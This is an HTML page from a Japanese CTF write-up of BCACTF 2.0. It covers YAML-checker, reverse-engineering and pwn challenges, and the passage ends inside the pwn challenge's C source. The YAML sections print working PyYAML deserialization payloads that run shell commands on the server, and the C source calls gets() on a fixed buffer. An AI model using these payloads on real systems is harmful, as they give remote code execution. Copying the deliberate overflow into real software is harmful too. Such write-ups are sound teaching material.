@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>BCACTF 2.0 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges 3975点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 [Misc]: Challenge Checker (150 points) Challenge I made this challenge checker to automate away ed&amp;rsquo;s job. Maybe you" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/bcactf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="BCACTF 2.0 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges 3975点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 [Misc]: Challenge Checker (150 points) Challenge I made this challenge checker to automate away ed&rsquo;s job. Maybe you" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/bcactf_2021/" />
+<meta property="article:published_time" content="2021-06-20T09:00:00+09:00" />
+<meta property="article:modified_time" content="2021-06-20T09:00:00+09:00" />
+<meta itemprop="name" content="BCACTF 2.0 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges 3975点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 [Misc]: Challenge Checker (150 points) Challenge I made this challenge checker to automate away ed&rsquo;s job. Maybe you">
+<meta itemprop="datePublished" content="2021-06-20T09:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-06-20T09:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1624">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BCACTF 2.0 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://play.bcactf.com/challenges 3975点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 [Misc]: Challenge Checker (150 points) Challenge I made this challenge checker to automate away ed&rsquo;s job. Maybe you"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">BCACTF 2.0 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-20 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-challenge-checker-150-points">[Misc]: Challenge Checker (150 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-challenge-checker-2-200-points">[Misc]: Challenge Checker 2 (200 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev-a-fun-game-100-points">[Rev]: A Fun Game (100 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-discrete-mathematics-250-points">[Pwn]: Discrete Mathematics (250 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fbcactf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://play.bcactf.com/challenges">https://play.bcactf.com/challenges</a>
+<br /><br /></p>
+<p>3975点を獲得し、最終順位は63位でした。<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_score.png" alt="bcactf_2021_score.png">
+<p><br><br></p>
+<p>以下はチャレンジのリストです。<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves1.png" alt="bcactf_2021_solves1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves2.png" alt="bcactf_2021_solves2.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves3.png" alt="bcactf_2021_solves3.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves4.png" alt="bcactf_2021_solves4.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/bcactf_2021_solves5.png" alt="bcactf_2021_solves5.png">
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-challenge-checker-150-points">[Misc]: Challenge Checker (150 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>I made this challenge checker to automate away ed&rsquo;s job. Maybe you can get a flag if you give it enough delicious yams&hellip;
+<br /><br />
+nc misc.bcactf.com 49153
+<br /><br />
+Hint1: Try looking up some documentation.
+<br />
+Hint2: Can you read flag.txt?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>chall.yaml</li>
+<li>requirements.txt</li>
+<li>verify.py</li>
+</ul>
+<br>
+<p>chall.yamlの中身：</p>
+<pre>
+name: Challenge Checker 
+categories:
+  - misc
+value: 150
+flag:
+  file: ./flag.txt
+description: |-
+  I made this challenge checker to automate away ed's job. Maybe you can get a flag if you give it enough delicious yams...
+hints:
+  - Try looking up some documentation.
+  - Can you get a shell?
+deploy:
+  nc:
+    build: .
+    expose: 9999
+files:
+  - src: chall.yaml
+  - src: requirements.txt
+  - src: verify.py
+authors:
+  - anli
+  - Edward Feng
+visible: true
+</pre>
+<br>
+<p>requirements.txtの中身：</p>
+<pre>
+PyYAML==3.13
+termcolor==1.1.0
+</pre>
+<br>
+<h3 id="solution">Solution</h3>
+<pre>
+$ echo '!!python/object/apply:os.system ["cat flag.txt"]' | nc misc.bcactf.com 49153
+Paste in your chall.yaml file, then send an EOF:
+bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
+</pre>
+<p><br /></p>
+<p>Flag: <code>bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-challenge-checker-2-200-points">[Misc]: Challenge Checker 2 (200 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>New version, better security, right?
+<br /><br />
+nc misc.bcactf.com 49154
+<br /><br />
+Hint1: What&rsquo;s changed?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>chall.yaml</li>
+<li>requirements.txt</li>
+<li>verify.py</li>
+</ul>
+<br>
+<p>requirements.txtの中身：</p>
+<pre>
+PyYAML==5.3.1
+termcolor==1.1.0
+</pre>
+<br>
+<h3 id="solution-1">Solution</h3>
+<p>PyYAMLのバージョンが 5.3.1 にあがっています。</p>
+<p>1のチャレンジ(前述)と同じ手順でやろうとすると、以下のエラーが出ます。</p>
+<pre>
+$ echo '!!python/object/apply:os.system ["cat flag.txt"]' | nc misc.bcactf.com 49154
+Paste in your chall.yaml file, then send an EOF:
+Fatal error: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:os.system'
+  in "<unicode string>", line 1, column 1:
+    !!python/object/apply:os.system  ...
+    ^
+
+echo '!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "cat flag.txt" ]]]' | nc misc.bcactf.com 49154
+Paste in your chall.yaml file, then send an EOF:
+Fatal error: invalid syntax (<string>, line 1)
+</pre>
+<br>
+<p>PyYAML 5.3.1 の脆弱性をググって、見つかったPoCをいろいろ試したところ、<br>
+<a href="https://hackmd.io/@harrier/uiuctf20">https://hackmd.io/@harrier/uiuctf20</a> に書かれていた方法でフラグが取れました。</p>
+<pre>
+$ cat poc5.txt
+!!python/object/new:type
+  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+  listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('cat flag\x2etxt')"
+
+$ cat poc5.txt | nc misc.bcactf.com 49154
+Paste in your chall.yaml file, then send an EOF:
+bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}
+</pre>
+<p><br /></p>
+<p>Flag: <code>bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="rev-a-fun-game-100-points">[Rev]: A Fun Game (100 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>A really fun game where you have to type the correct letter 1000 times to get the flag! It won&rsquo;t take that long, right? It&rsquo;s not like there&rsquo;s another way to do it&hellip;
+<br /><br />
+Note, The executable is built for Linux and can be run with mono Game.exe
+<br /><br />
+Hint1: Is it possible to modify the variable storing your points?
+<br />
+Hint2: What does a program like GameConqueror or CheatEngine do?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>Game.exe</li>
+</ul>
+<h3 id="solution-2">Solution</h3>
+<p>stringsで解けてしまった。</p>
+<pre>
+$ strings -el Game.exe | more
+.s^O
+abcdefghijklmnopqrstuvwxyz
+Hello!
+Write the correct letter 1,000 times to get the flag!
+Not that hard, right?
+Type '0' to stop.
+Type the letter '{0}':
+Correct! Current points:
+Incorrect. Current Points:
+Incorrect input.
+}sr3tte1_0001_epYt_yl1aUtca_tNd1d_U0y_yl1uf3p0h{ftcacb
+
+$ echo 'u"}sr3tte1_0001_epYt_yl1aUtca_tNd1d_U0y_yl1uf3p0h{ftcacb' | rev
+bcactf{h0p3fu1ly_y0U_d1dNt_actUa1ly_tYpe_1000_1ett3rs}"u
+</pre>
+<p><br /></p>
+<p>Flag: <code>bcactf{h0p3fu1ly_y0U_d1dNt_actUa1ly_tYpe_1000_1ett3rs}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-discrete-mathematics-250-points">[Pwn]: Discrete Mathematics (250 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>BCA&rsquo;s top-level math track! We have proofs, trig, parametric, polar, linear algebra, calculus, &hellip; You&rsquo;ll just have to demonstrate your skills before getting the flag.
+<br /><br />
+nc bin.bcactf.com 49160
+<br /><br />
+Hint1: You can&rsquo;t just jump to the flag function directly.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>discrete.c</li>
+<li>discrete (ELF 64bit)</li>
+</ul>
+<br>
+<p>discrete.cの中身：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">knows_logic</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">knows_algebra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">knows_functions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">logic</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;p: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;q: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">q</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;r: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;s: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+    
+    <span class="n">knows_logic</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">||</span> <span class="n">q</span> <span class="o">||</span> <span class="o">!</span><span class="n">r</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span> <span class="o">||</span> <span class="n">r</span> <span class="o">||</span> <span class="o">!</span><span class="n">s</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">q</span> <span class="o">!=</span> <span class="n">s</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">algebra</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;x: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;y: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;z: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">eq1</span> <span class="o">=</span> <span class="mi">5</span><span class="o">*</span><span class="n">x</span> <span class="o">-</span> <span class="mi">6</span><span class="o">*</span><span class="n">y</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">z</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">eq2</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="n">y</span> <span class="o">-</span> <span class="mi">7</span><span class="o">*</span><span class="n">z</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">eq3</span> <span class="o">=</span> <span class="mi">4</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="n">y</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="n">z</span><span class="p">;</span>
+
+    <span class="n">knows_algebra</span> <span class="o">=</span> <span class="p">(</span><span class="n">eq1</span> <span class="o">==</span> <span class="mi">153</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">eq2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">163</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">eq3</span> <span class="o">==</span> <span class="o">-</span><span class="mi">28</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">functions</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;a: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;b: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;c: &#34;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">vertex_x</span> <span class="o">=</span> <span class="o">-</span><span class="n">b</span> <span class="o">/</span> <span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">a</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">vertex_y</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">vertex_x</span> <span class="o">*</span> <span class="n">vertex_x</span> <span class="o">+</span> <span class="n">b</span> <span class="o">*</span> <span class="n">vertex_x</span> <span class="o">+</span> <span class="n">c</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">discriminant</span> <span class="o">=</span> <span class="n">b</span> <span class="o">*</span> <span class="n">b</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span> <span class="o">*</span> <span class="n">c</span><span class="p">;</span>
+
+    <span class="n">knows_functions</span> <span class="o">=</span> <span class="p">(</span><span class="n">vertex_x</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">vertex_y</span> <span class="o">==</span> <span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">discriminant</span> <span class="o">==</span> <span class="mi">16</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">quiz</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Sorry, all my stuff&#39;s a mess.&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;I&#39;ll get around to grading your quiz sometime.&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[If you are seeing this on the remote server, please contact admin].&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">knows_logic</span> <span class="o">&amp;&amp;</span> <span class="n">knows_algebra</span> <span class="o">&amp;&amp;</span> <span class="n">knows_functions</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Alright, you passed this quiz.&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Here&#39;s your prize:&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Not there yet...&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Study some more!&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">response</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Discrete.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;The top math track.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;The best BCA students.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;The crème de la crème.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;We have high expectations.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Answer all the questions correctly.&#34;</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Do not disappoint us.&#34;</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&#34;i will get an A&#34;</span><span class="p">))</span> <span class="p">{</span>
